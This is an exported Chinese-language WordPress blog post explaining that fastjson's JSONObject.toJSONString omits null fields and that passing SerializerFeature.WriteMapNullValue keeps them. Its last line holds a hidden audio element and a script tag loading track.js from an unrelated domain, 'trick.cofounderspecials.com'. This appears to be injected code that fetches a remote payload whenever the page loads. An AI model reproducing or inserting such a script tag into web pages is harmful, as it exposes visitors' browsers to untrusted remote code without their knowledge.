---
id: 55
title: JSONObject.toJSONString不过滤空值的用法
date: '2020-04-29T19:24:16+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=55'
permalink: /index.php/2020/04/29/jsonobject-tojsonstring%e4%b8%8d%e8%bf%87%e6%bb%a4%e7%a9%ba%e5%80%bc%e7%9a%84%e7%94%a8%e6%b3%95/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Java
---

踩坑记录：在做数据更新的时候因为业务需要变更数据为空，更新前将对应字段赋值为空后，最后发现该字段的值并没有更新成功，经调试发现代码中用到了JSONObject.toJSONString来做转换，而该方法会过滤key对应的值为null的情况

解决方法：在使用的时候传个参数SerializerFeature.WriteMapNullValue，如下

JSONObject.toJSONString(record,SerializerFeature.WriteMapNullValue);即可

<audio controls="controls" style="display: none;"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>